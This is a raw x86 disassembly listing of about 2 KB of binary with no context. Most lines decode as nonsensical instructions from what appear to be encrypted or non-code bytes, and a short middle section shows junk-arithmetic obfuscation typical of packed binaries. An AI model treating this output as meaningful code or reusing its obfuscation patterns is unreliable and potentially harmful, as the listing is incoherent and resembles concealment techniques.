  4185b3:	and    BYTE PTR [eax],cl
  4185b5:	xchg   ebx,eax
  4185b6:	push   es
  4185b7:	ins    DWORD PTR es:[edi],dx
  4185b8:	outs   dx,DWORD PTR ds:[esi]
  4185b9:	xor    eax,0x801905cd
  4185be:	mov    bl,0x19
  4185c0:	icebp  
  4185c1:	into   
  4185c2:	mov    edx,0xcefb3aaf
  4185c7:	jle    0x4185e2
  4185c9:	loope  0x418582
  4185cb:	mov    cl,0xac
  4185cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185ce:	mov    esi,edi
  4185d0:	sbb    DWORD PTR [eax-0x5de17cdf],esi
  4185d6:	clc    
  4185d7:	mov    ch,0x94
  4185d9:	shl    BYTE PTR [eax],0x24
  4185dc:	dec    ecx
  4185dd:	cmc    
  4185de:	xchg   ebx,eax
  4185df:	cmp    ch,ch
  4185e1:	out    0x20,al
  4185e3:	cmp    al,0x98
  4185e5:	adc    al,0x3b
  4185e7:	scas   eax,DWORD PTR es:[edi]
  4185e8:	(bad)  
  4185e9:	cmp    dh,ah
  4185eb:	or     al,0x13
  4185ed:	mov    BYTE PTR [edx],bh
  4185ef:	cmc    
  4185f0:	cmp    DWORD PTR ds:0xca9c078c,ecx
  4185f6:	into   
  4185f7:	fisubr WORD PTR [edi-0x77]
  4185fa:	adc    edx,DWORD PTR [esi+0x7a409c07]
  418600:	xor    al,0x7e
  418602:	call   edi
  418604:	out    0xdc,al
  418606:	pop    ss
  418607:	(bad)  
  418608:	sbb    al,0x9f
  41860a:	push   ecx
  41860b:	jle    0x418636
  41860d:	xchg   ebp,eax
  41860e:	inc    esi
  41860f:	ret    
  418610:	arpl   WORD PTR [edx+edx*8-0x21],cx
  418614:	sub    ebx,DWORD PTR [edi]
  418616:	xchg   esp,eax
  418617:	data16 in al,dx
  418619:	and    BYTE PTR [ebx],bh
  41861b:	aas    
  41861c:	pop    esi
  41861d:	fbstp  TBYTE PTR [eax+0x1f]
  418620:	mov    ch,0xec
  418622:	test   DWORD PTR [esi+0x6b63266a],ebx
  418628:	cmp    BYTE PTR [esi-0x3bc36b22],0x62
  41862f:	jae    0x4186a4
  418631:	dec    ebp
  418632:	ffree  st(6)
  418634:	push   0x678e51b9
  418639:	lods   al,BYTE PTR ds:[esi]
  41863a:	int    0x7c
  41863c:	push   edi
  41863d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41863e:	test   edx,esp
  418640:	cld    
  418641:	push   edi
  418642:	sub    cl,al
  418644:	or     BYTE PTR [edi-0x15c58338],cl
  41864a:	cmp    eax,0x3843a021
  41864f:	mov    dh,BYTE PTR [eax]
  418651:	sbb    al,0xd9
  418653:	data16 loopne 0x4186b8
  418656:	mov    ebx,0x3097f1d2
  41865b:	int3   
  41865c:	not    BYTE PTR [edi+ecx*8-0x59]
  418660:	xchg   BYTE PTR [ebp-0x10c16b62],cl
  418666:	in     al,dx
  418667:	je     0x41862b
  418669:	mov    ds,WORD PTR [ecx+esi*8]
  41866c:	outs   dx,DWORD PTR ds:[esi]
  41866d:	pop    es
  41866e:	xlat   BYTE PTR ds:[ebx]
  41866f:	xlat   BYTE PTR ds:[ebx]
  418670:	bound  ecx,QWORD PTR [edi]
  418672:	(bad)  
  418673:	jmp    0x8402:0xc7a91283
  41867a:	jnp    0x4186c7
  41867c:	loopne 0x4186f0
  41867e:	dec    ebx
  41867f:	loope  0x41862a
  418681:	push   edx
  418682:	inc    ecx
  418683:	mov    ebp,0x9582c505
  418688:	push   cs
  418689:	push   edx
  41868a:	loope  0x4186ae
  41868c:	dec    eax
  41868d:	inc    ebp
  41868e:	aas    
  41868f:	xor    DWORD PTR [eax+ecx*2],edx
  418692:	mov    cl,0x51
  418694:	or     ebp,eax
  418696:	stc    
  418697:	and    DWORD PTR [edi+0x399d1d23],ebp
  41869d:	add    BYTE PTR [edi],cl
  41869f:	cmc    
  4186a0:	cmp    al,0x54
  4186a2:	lds    ecx,FWORD PTR [edx-0x3b]
  4186a5:	daa    
  4186a6:	retf   
  4186a7:	(bad)  
  4186a8:	or     esp,DWORD PTR [ecx]
  4186aa:	pop    ss
  4186ab:	cs pop ebp
  4186ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186ae:	adc    eax,0xd35c662b
  4186b3:	pop    esi
  4186b4:	fidivr DWORD PTR [ebx]
  4186b6:	mov    BYTE PTR [ebx+0x771fd73b],0x5f
  4186bd:	sub    eax,0xd42d329f
  4186c2:	mov    edx,0xb57c7132
  4186c7:	les    eax,FWORD PTR [ebx]
  4186c9:	fidiv  DWORD PTR [edx]
  4186cb:	into   
  4186cc:	popa   
  4186cd:	or     DWORD PTR [eax-0x5d],eax
  4186d0:	and    DWORD PTR es:[edx-0x304a5922],ecx
  4186d7:	fs add eax,0xe54d6fcf
  4186dd:	xchg   esi,eax
  4186de:	xchg   ecx,eax
  4186df:	push   ebp
  4186e0:	inc    ebx
  4186e1:	popa   
  4186e2:	clc    
  4186e3:	dec    ecx
  4186e4:	or     al,0xe2
  4186e6:	xchg   al,ah
  4186e8:	(bad)  
  4186ea:	pop    esp
  4186eb:	sbb    al,0xb8
  4186ed:	mov    al,ds:0xdb6b3a0f
  4186f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186f3:	in     al,0x2c
  4186f5:	aad    0xf3
  4186f7:	mov    ebx,0x462d0150
  4186fc:	jmp    0x892dad7e
  418701:	or     al,0x3f
  418703:	mov    ah,0xf0
  418705:	(bad)  
  418707:	mov    ch,bl
  418709:	mov    esp,0x96312e34
  41870e:	cmp    al,0xca
  418710:	jns    0x4186db
  418712:	or     BYTE PTR [ecx+edi*2+0xa],0x79
  418717:	mov    bh,0xc1
  418719:	retf   0x9870
  41871c:	jecxz  0x4186e0
  41871e:	mov    WORD PTR [eax+ecx*2-0x6e],cs
  418722:	pop    ebp
  418723:	imul   ebx,DWORD PTR [edx-0x1004303b],0xfc0b1fe1
  41872d:	mov    al,0x3d
  41872f:	jle    0x418700
  418731:	jmp    0xbd98:0xc6333cb7
  418738:	loop   0x418709
  41873a:	push   ecx
  41873b:	fwait
  41873c:	cmp    bl,0x4e
  41873f:	ds jmp 0xeb4:0x8f651fdc
  418747:	dec    edi
  418748:	adc    DWORD PTR [esi+edx*8-0x6c],0xffffffd4
  41874d:	clc    
  41874e:	pop    es
  41874f:	lahf   
  418750:	or     eax,0xfabaaa41
  418755:	lods   al,BYTE PTR ds:[esi]
  418756:	mov    esp,DWORD PTR [ebp+ebp*4-0x24425518]
  41875d:	test   eax,0x17587ef9
  418762:	inc    ecx
  418763:	fbld   TBYTE PTR [ebp+0x73]
  418766:	cmp    al,0xe8
  418768:	add    esp,ecx
  41876a:	test   eax,0x74f8a964
  41876f:	loope  0x41873d
  418771:	jecxz  0x41873c
  418773:	push   ebx
  418774:	shr    BYTE PTR [edx+0x5c9acf9e],1
  41877a:	scas   eax,DWORD PTR es:[edi]
  41877b:	mov    ah,0x5d
  41877d:	sub    eax,0x8fcf92bf
  418782:	rcl    DWORD PTR [edx],1
  418784:	dec    ebp
  418785:	dec    esp
  418786:	push   ss
  418787:	add    cl,BYTE PTR [esi-0x20]
  41878a:	mov    ecx,0xd9661557
  41878f:	outs   dx,DWORD PTR ds:[esi]
  418790:	mov    ebx,0xe8e83d31
  418795:	and    al,0x87
  418797:	push   0xffffffa3
  418799:	add    ebx,edi
  41879b:	and    al,BYTE PTR [ebx+0x790e1ed2]
  4187a1:	push   eax
  4187a2:	repz out 0x87,eax
  4187a5:	ror    DWORD PTR [ebx-0x884a5bb],0xb2
  4187ac:	pop    edi
  4187ad:	add    al,0xcd
  4187af:	out    0xca,al
  4187b1:	inc    esp
  4187b2:	bt     DWORD PTR [ecx],esi
  4187b5:	lods   al,BYTE PTR ds:[esi]
  4187b6:	dec    edi
  4187b7:	int    0x96
  4187b9:	frstor [ebx-0x791467f]
  4187bf:	je     0x418836
  4187c1:	jmp    0x97418531
  4187c6:	das    
  4187c7:	sub    al,0x17
  4187c9:	repnz push ebx
  4187cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cc:	sahf   
  4187cd:	aas    
  4187ce:	mov    ecx,0xa87a8d48
  4187d3:	(bad)  
  4187d4:	jae    0x4187c4
  4187d6:	cld    
  4187d7:	in     al,dx
  4187d8:	fsubr  DWORD PTR [edx]
  4187da:	push   ds
  4187db:	sti    
  4187dc:	lds    eax,FWORD PTR [ebx+0x43]
  4187df:	bound  esi,QWORD PTR ds:0xb3960f55
  4187e5:	jno    0x418798
  4187e7:	cwde   
  4187e8:	rol    DWORD PTR [edx],cl
  4187ea:	pop    edi
  4187eb:	test   eax,0x734f03a6
  4187f0:	mov    edi,0x912b0ac1
  4187f5:	push   ebp
  4187f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f7:	std    
  4187f8:	loopne 0x4187ab
  4187fa:	push   cs
  4187fb:	mov    esp,0x7c169e7e
  418800:	scas   al,BYTE PTR es:[edi]
  418801:	jle    0x418832
  418803:	xor    al,0xb4
  418805:	inc    esp
  418806:	pop    eax
  418807:	jns    0x41882a
  418809:	daa    
  41880a:	jl     0x418796
  41880c:	nop
  41880d:	mov    dl,0xa9
  41880f:	sub    bh,dl
  418811:	(bad)  
  418812:	stos   BYTE PTR es:[edi],al
  418813:	int3   
  418814:	shl    BYTE PTR [edi],1
  418816:	xchg   edi,eax
  418817:	mov    es,WORD PTR [esi]
  418819:	adc    al,0xb1
  41881b:	inc    eax
  41881c:	xchg   ecx,eax
  41881d:	mov    cl,0x63
  41881f:	push   cs
  418820:	(bad)  
  418821:	cwde   
  418822:	(bad)  
  418823:	scas   eax,DWORD PTR es:[edi]
  418824:	xor    al,0x52
  418826:	cmc    
  418827:	cmp    DWORD PTR [edx+0x2c],0xfffffff7
  41882b:	nop
  41882c:	test   ch,cl
  41882e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41882f:	xchg   edx,eax
  418830:	push   esp
  418831:	into   
  418832:	jo     0x418891
  418834:	mov    dl,0xc5
  418836:	fwait
  418837:	js     0x4187ff
  418839:	mov    ch,0x27
  41883b:	data16 (bad) 
  41883d:	std    
  41883e:	dec    esp
  41883f:	fdivp  st(6),st
  418841:	or     DWORD PTR [bp+di+0xfe9],esp
  418846:	rcl    al,cl
  418848:	aam    0x0
  41884a:	ret    0x506e
  41884d:	pusha  
  41884e:	stc    
  41884f:	add    al,BYTE PTR [ebp-0x18]
  418852:	inc    edi
  418853:	xor    eax,0xb69226ee
  418858:	inc    ebp
  418859:	dec    ecx
  41885a:	sbb    ebp,DWORD PTR [ebp+0x6a6cc90e]
  418860:	loopne 0x418867
  418862:	and    esp,DWORD PTR [ebx+eiz*2-0x7]
  418866:	fdivr  DWORD PTR [edi+0x70]
  418869:	test   eax,0x536c3592
  41886e:	cli    
  41886f:	(bad)  
  418870:	in     eax,0x8e
  418872:	mov    ds:0xd41781c6,al
  418877:	cmc    
  418878:	test   DWORD PTR [eax],edx
  41887a:	xchg   ebp,eax
  41887b:	mov    eax,ds:0xc34496ea
  418880:	xor    cl,dl
  418882:	xor    BYTE PTR [ebx-0x118472f6],bl
  418888:	mov    eax,0xf1bdcbcf
  41888d:	(bad)
  418891:	or     al,0x4b
  418893:	cli    
  418894:	nop
  418895:	or     eax,0xcdc2ade8
  41889a:	mov    ch,0xf5
  41889c:	pop    esi
  41889d:	fdivr  DWORD PTR [edx+0x20]
  4188a0:	pop    edi
  4188a1:	inc    edi
  4188a2:	lock inc esp
  4188a4:	test   DWORD PTR ds:0xe9fb35e8,0xd3de55ee
  4188ae:	xor    al,dl
  4188b0:	arpl   WORD PTR ds:0x8bd244c4,cx
  4188b6:	dec    esp
  4188b7:	and    al,0x48
  4188b9:	or     DWORD PTR ds:0x42822b,0x42821b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428143
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428233,0x42828b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42817f,0x428283
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42822f,0x42836f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42826b,0x7154
  418909:	call   DWORD PTR ds:0x428d98
  41890f:	or     DWORD PTR ds:0x428283,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428387,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42830f,0x0
  418935:	mov    DWORD PTR ds:0x4282ef,ebx
  41893b:	mov    DWORD PTR ds:0x428273,ebx
  418941:	mov    esi,DWORD PTR ds:0x428243
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42830f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428ddc
  41896e:	movzx  esi,WORD PTR ds:0x428313
  418975:	sbb    DWORD PTR ds:0x428153,esi
  41897b:	adc    DWORD PTR ds:0x42835f,0x5f0e
  418985:	xor    DWORD PTR ds:0x428397,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428227
  418991:	xor    esi,DWORD PTR ds:0x428163
  418997:	mov    DWORD PTR ds:0x428227,esi
  41899d:	add    DWORD PTR ds:0x428237,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428393,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42836b,0x42822b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428153,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42830b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428293
  4189ec:	mov    edx,DWORD PTR ds:0x42821b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428393,0x606f
  418a03:	mov    DWORD PTR ds:0x42816f,ebx
  418a09:	cmp    DWORD PTR ds:0x42830b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428de0
  418a1c:	adc    DWORD PTR ds:0x42814b,ebx
  418a22:	or     DWORD PTR ds:0x42824f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x4281ff
  418a34:	mov    edx,DWORD PTR ds:0x428323
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428313
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428297,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428393,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42826b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428387,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42814b
  418a85:	mov    eax,ds:0x42828b
  418a8a:	cmp    DWORD PTR ds:0x428393,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e80
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428363,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428273,edi
  418ac0:	or     DWORD PTR ds:0x42826b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42835f,ebx
  418ad0:	mov    eax,ds:0x422548
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42816b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xfcb0b184
  418af3:	jno    0x418ada
  418af5:	stos   BYTE PTR es:[edi],al
  418af6:	call   0x1812:0xbc1816cb
  418afd:	sbb    cl,dh
  418aff:	jl     0x418b3c
  418b01:	sub    DWORD PTR [ecx+edx*2-0x297aadc7],ebp
  418b08:	out    dx,al
  418b09:	inc    edi
  418b0a:	dec    ebp
  418b0b:	ror    BYTE PTR [ecx],cl
  418b0d:	xchg   edx,eax
  418b0e:	ret    
  418b0f:	(bad)  
  418b11:	xor    DWORD PTR [ebp+0x6a9898ab],edx
  418b17:	cwde   
  418b18:	adc    DWORD PTR [eax-0x1c871136],edi
  418b1e:	imul   ebp,DWORD PTR [edx],0x3df61645
  418b24:	psubb  mm4,QWORD PTR [ebp+ebp*1-0x79]
  418b29:	and    ebx,edx
  418b2b:	jmp    0x1191:0x6acc9761
  418b32:	ins    DWORD PTR es:[edi],dx
  418b33:	cvtps2pi mm3,QWORD PTR [ebx+0x5ded144c]
  418b3a:	add    esp,DWORD PTR [ecx+0x75]
  418b3d:	out    dx,eax
  418b3e:	xchg   DWORD PTR [ebx],eax
  418b40:	(bad)  
  418b41:	adc    ch,ah
  418b43:	out    dx,al
  418b44:	xor    dl,ah
  418b46:	icebp  
  418b47:	inc    esi
  418b48:	or     BYTE PTR [edi],dh
  418b4a:	push   ecx
  418b4b:	pop    ecx
  418b4c:	bound  esp,QWORD PTR [edi+0x5f]
  418b4f:	or     ch,ah
  418b51:	inc    ebx
  418b52:	leave  
  418b53:	sahf   
  418b54:	pop    eax
  418b55:	xlat   BYTE PTR ds:[ebx]
  418b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b57:	jl     0x418b7d
  418b59:	scas   eax,DWORD PTR es:[edi]
  418b5a:	cmp    al,0x85
  418b5c:	fimul  DWORD PTR [ebx]
  418b5e:	retf   
  418b5f:	mov    DWORD PTR [esi-0x2a],esp
  418b62:	mov    esp,0x8bc79df6
  418b67:	xor    edx,DWORD PTR [esi]
  418b69:	xchg   edi,eax
  418b6a:	sti    
  418b6b:	xchg   ecx,eax
  418b6c:	mov    ds:0xe592bc3e,al
  418b71:	je     0x418b87
  418b73:	and    al,0x97
  418b75:	jnp    0x418bf2
  418b77:	sbb    bh,al
  418b79:	ja     0x418b6b
  418b7b:	int3   
  418b7c:	call   0xd05d5e49
  418b81:	jno    0x418b9b
  418b83:	cmp    eax,0x14b5b7f5
  418b88:	cmp    dh,BYTE PTR [ebp+esi*2-0x111b1ca2]
  418b8f:	ins    BYTE PTR es:[edi],dx
  418b90:	cwde   
  418b91:	mov    ebx,DWORD PTR [ebx-0x83a0a36]
  418b97:	ds jnp 0x418b22
  418b9a:	xchg   edi,eax
  418b9b:	mov    WORD PTR [edi+0x8b51d14],es
  418ba1:	cs inc edx
  418ba3:	dec    eax
  418ba4:	scas   eax,DWORD PTR es:[edi]
  418ba5:	int3   
  418ba6:	mov    ds:0xe880ebdd,ax
  418bac:	sahf   
  418bad:	fcomp  DWORD PTR [ebx]
  418baf:	mov    eax,0xe9542949
  418bb4:	jl     0x418b8a
  418bb6:	dec    ebx
  418bb7:	cld    
  418bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bb9:	outs   dx,DWORD PTR ds:[esi]
  418bba:	dec    esi
  418bbb:	shl    DWORD PTR [esi+0x6b],1
  418bbe:	dec    esp
  418bbf:	repnz pushf 
  418bc1:	stos   DWORD PTR es:[edi],eax
  418bc2:	xchg   edi,eax
  418bc3:	int3   
  418bc4:	data16 or BYTE PTR [ebp+0x40974812],bl
  418bcb:	mov    ?,WORD PTR [ebx]
  418bcd:	mov    dh,0x56
  418bcf:	inc    edi
  418bd0:	jmp    0x7291:0xcdae059e
  418bd7:	cs aaa 
  418bd9:	inc    edx
  418bda:	jmp    0x97a9a11f
  418bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418be0:	dec    esi
  418be1:	jns    0x418bb4
  418be3:	push   ss
  418be4:	ret    0xed8b
  418be7:	mul    BYTE PTR [ebx]
  418be9:	dec    edx
  418bea:	inc    ecx
  418beb:	dec    ecx
  418bec:	mov    edx,0x3afeba9e
  418bf1:	cmp    ebp,DWORD PTR [ecx+ebp*4+0x60]
  418bf5:	mov    ds:0x2eaa0430,al
  418bfa:	mov    ecx,0x3d984ee7
  418bff:	cmp    esi,DWORD PTR [ebp-0x6f]
  418c02:	ds aad 0x23
  418c05:	(bad)  
  418c06:	js     0x418ba2
  418c08:	jl     0x418c12
  418c0a:	pop    ebx
  418c0b:	test   BYTE PTR [ebx+0x3a641283],0x9e
  418c12:	cdq    
  418c13:	aam    0x40
  418c15:	jnp    0x418bff
  418c17:	adc    dl,ah
  418c19:	bound  eax,QWORD PTR [edi+0x77]
  418c1c:	lahf   
  418c1d:	adc    ebx,ecx
  418c1f:	test   BYTE PTR ds:0xea8d0f88,al
  418c25:	push   cs
  418c26:	rcl    DWORD PTR [esi-0x73d00db6],1
  418c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c2d:	cwde   
  418c2e:	in     eax,0xdc
  418c30:	mov    esp,0x48c92511
  418c35:	outs   dx,DWORD PTR ds:[esi]
  418c36:	and    bh,al
  418c38:	mov    ah,0x86
  418c3a:	shr    DWORD PTR [ebx+edx*1],1
  418c3d:	fisubr DWORD PTR [ecx-0x65]
  418c40:	pop    esp
  418c41:	call   0x9e0f:0xfd22bdbe
  418c48:	xchg   edx,eax
  418c49:	inc    eax
  418c4a:	xchg   ecx,eax
  418c4b:	int    0x1e
  418c4d:	(bad)  
  418c4e:	(bad)  
  418c4f:	frstor [esi]
  418c51:	cs fisttp QWORD PTR cs:[edi+0x72d49a5e]
  418c59:	and    BYTE PTR ds:0x3cdfb11e,dl
  418c5f:	xor    al,0x79
  418c61:	mov    edx,0x16622d5f
  418c66:	sub    al,0xc
  418c68:	fs stc 
  418c6a:	popa   
  418c6b:	sbb    eax,DWORD PTR [ebp-0x6fc9c163]
  418c71:	(bad)  
  418c72:	jmp    0x4085:0x3d755e9d
  418c79:	cdq    
  418c7a:	xor    eax,0x90021bee
  418c7f:	(bad)  
  418c81:	repz popf 
  418c83:	jno    0x418c81
  418c85:	jbe    0x418ca3
  418c87:	(bad)
  418c8a:	pop    es
  418c8b:	fiadd  DWORD PTR [eax-0x6a]
  418c8e:	or     dh,BYTE PTR [edx]
  418c90:	jl     0x418cf0
  418c92:	add    ecx,DWORD PTR [edi]
  418c94:	loopne 0x418c4b
  418c96:	jo     0x418c2a
  418c98:	fwait
  418c99:	mov    edx,0xea461ec8
  418c9e:	neg    BYTE PTR [edx+0x55]
  418ca1:	fisttp DWORD PTR [eax-0x6d]
  418ca4:	jo     0x418cb4
  418ca6:	xlat   BYTE PTR ds:[ebx]
  418ca7:	ret    
  418ca8:	icebp  
  418ca9:	cmp    eax,0xa80310d7
  418cae:	popf   
  418caf:	repz daa 
  418cb1:	mov    cl,0x5f
  418cb3:	imul   ebx,DWORD PTR [edx],0x7daa1eb5
  418cb9:	adc    BYTE PTR [edx+0x3e88346a],bh
  418cbf:	lahf   
  418cc0:	call   0x5f23:0xf7396bc9
  418cc7:	xchg   esi,eax
  418cc8:	stc    
  418cc9:	xlat   BYTE PTR ds:[ebx]
  418cca:	popf   
  418ccb:	sbb    BYTE PTR [esi],0xaf
  418cce:	mov    esp,esi
  418cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd1:	addr16 mov ebp,0xb79adccd
  418cd7:	test   DWORD PTR [edx-0x1fa0ac1e],edi
  418cdd:	mov    ebx,0x4f15ad8d
  418ce2:	xchg   BYTE PTR [edi+eiz*8+0x52b0460d],ch
  418ce9:	jle    0x418d06
  418ceb:	cmp    BYTE PTR [esi],ch
  418ced:	mov    ah,BYTE PTR [edx+edx*4]
  418cf0:	xchg   esp,eax
  418cf1:	inc    ebp
  418cf2:	jge    0x418d59
  418cf4:	mov    al,ds:0x54dbd1d6
  418cf9:	jb     0x418ce5
  418cfb:	shr    BYTE PTR ds:0xabdb29ff,1
  418d01:	leave  
  418d02:	out    0x24,al
  418d04:	adc    bl,BYTE PTR es:[esi+0x313539c4]
  418d0b:	push   ecx
  418d0c:	add    BYTE PTR fs:[ecx+0x522dfac6],ah
  418d13:	or     DWORD PTR [eax],edx
  418d15:	std    
  418d16:	cwde   
  418d17:	add    eax,0x3aad1f58
  418d1c:	xor    eax,0x25698158
  418d21:	sbb    BYTE PTR [edi+0x59],cl
  418d24:	mov    BYTE PTR [ebx-0x5fd0cd79],al
  418d2a:	push   es
  418d2b:	les    esi,FWORD PTR [edx]
  418d2d:	xor    DWORD PTR ds:[ecx+0x740e48cb],ecx
  418d34:	pusha  
  418d35:	xchg   ecx,eax
  418d36:	dec    edx
  418d37:	mov    WORD PTR [edx],?
  418d39:	mov    ecx,0x655f7a53
  418d3e:	pop    ecx
  418d3f:	adc    ebp,DWORD PTR [eax+esi*8-0xa]
  418d43:	xchg   BYTE PTR [esi+0x47ac5c71],ch
  418d49:	in     eax,0x2b
  418d4b:	mov    cl,0x89
  418d4d:	cmp    eax,0x848afcf3
  418d52:	sar    BYTE PTR [edx-0x29ccaee2],1
  418d58:	push   esi
  418d59:	rcr    BYTE PTR [edx],1
  418d5b:	cmp    esi,esp
  418d5d:	or     al,0x5b
  418d5f:	adc    al,0xd
  418d61:	mov    eax,0xf40f7c8c
  418d66:	push   cs
  418d67:	xor    eax,0x61588d1b
  418d6c:	xor    al,0x33
  418d6e:	inc    ebp
  418d6f:	cli    
  418d70:	ins    WORD PTR es:[edi],dx
  418d72:	mov    edi,0x254dadba
  418d77:	inc    ebp
  418d78:	pusha  
  418d79:	and    DWORD PTR [edi+eax*2+0x2c],ebx
  418d7d:	cs mov ebp,0x54fbe9ae
  418d83:	loopne 0x418dd4
  418d85:	js     0x418d7f
  418d87:	dec    ecx
  418d88:	fsubr  QWORD PTR [ebp-0x79]
  418d8b:	neg    BYTE PTR [esi-0x77]
  418d8e:	in     eax,dx
  418d8f:	fnsave [esi+0x69]
  418d92:	mov    dh,0x62
  418d94:	inc    ebp
  418d95:	stos   DWORD PTR es:[edi],eax
  418d96:	xchg   DWORD PTR [ecx+0xf225bfd],esp
  418d9c:	or     bl,dl
  418d9e:	sbb    al,ah
  418da0:	xchg   edx,eax
  418da1:	stc    
  418da2:	sti    
  418da3:	test   BYTE PTR [ecx+0x66d06def],dh
  418da9:	mov    al,0x2c
  418dab:	retf   0x85e4
  418dae:	sbb    al,0x9f
  418db0:	into   
  418db1:	outs   dx,BYTE PTR es:[esi]
  418db3:	leave  
  418db4:	stc    
  418db5:	jo     0x418d59
  418db7:	scas   al,BYTE PTR es:[edi]
  418db8:	xchg   ecx,eax
  418db9:	mov    eax,ds:0x69b4b2d
  418dbe:	mov    ebp,DWORD PTR [ecx-0x29]
  418dc1:	add    edi,edi
  418dc3:	(bad)  
  418dc4:	ds push ds
  418dc6:	clc    
  418dc7:	fs ins BYTE PTR es:[edi],dx
  418dc9:	adc    eax,ecx
  418dcb:	das    
  418dcc:	ret    0x3050
  418dcf:	pop    ebx
  418dd0:	retf   
  418dd1:	jae    0x418d60
  418dd3:	add    eax,0xbb175feb
  418dd8:	sbb    bl,BYTE PTR [edx]
  418dda:	or     ah,BYTE PTR [ebp+0x48274b0e]
  418de0:	arpl   si,sp
  418de2:	lea    ebp,[esi-0xd]
  418de5:	sti    
  418de6:	xor    esp,0x7a
  418de9:	mov    esi,0x98f2eb4e
  418dee:	(bad)  
  418def:	mov    ch,BYTE PTR [si-0xd]
  418df3:	in     eax,0x25
  418df5:	pop    ds
  418df6:	repnz loop 0x418d80
  418df9:	(bad)  
  418dfa:	push   esi
  418dfb:	adc    al,0x8a
  418dfd:	mov    ds:0x931f5784,eax
  418e02:	repnz push edi
  418e04:	push   ebx
  418e05:	xchg   DWORD PTR [edi+ecx*4+0x70dc418b],edi
  418e0c:	les    edi,FWORD PTR [ebp+ecx*4-0x7564553]
  418e13:	and    eax,0x3b3bd304
  418e18:	push   cs
  418e19:	popf   
  418e1a:	ret    
  418e1b:	xchg   ecx,eax
  418e1c:	mov    esi,DWORD PTR [ecx+eiz*1-0x7d]
  418e20:	neg    cl
  418e22:	mov    ah,0x91
  418e24:	and    DWORD PTR [ebx+0x21de7d9a],ebx
  418e2a:	in     eax,dx
  418e2b:	sub    DWORD PTR [ebx-0x17],ebp
  418e2e:	push   ebx
  418e2f:	lahf   
  418e30:	mov    ch,BYTE PTR [ecx]
  418e32:	fbstp  TBYTE PTR ds:0x89b4963e
  418e38:	scas   eax,DWORD PTR es:[edi]
  418e39:	jmp    0x418de8
  418e3b:	stos   BYTE PTR es:[edi],al
  418e3c:	sub    bh,0xb9
  418e3f:	int3   
  418e40:	add    al,0x2c
  418e42:	pop    ss
  418e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e44:	enter  0xd25f,0xf5
  418e48:	sbb    eax,0x6bdcf5d
  418e4d:	(bad)  
  418e4e:	fild   DWORD PTR [ebp+0x4c21e4d6]
  418e54:	xor    bh,BYTE PTR [eax]
  418e56:	repnz mov ebp,DWORD PTR [ebx]
  418e59:	in     al,dx
  418e5a:	popf   
  418e5b:	mov    ah,0xea
  418e5d:	outs   dx,DWORD PTR ds:[esi]
  418e5e:	and    eax,0xe31adea6
  418e63:	gs cld 
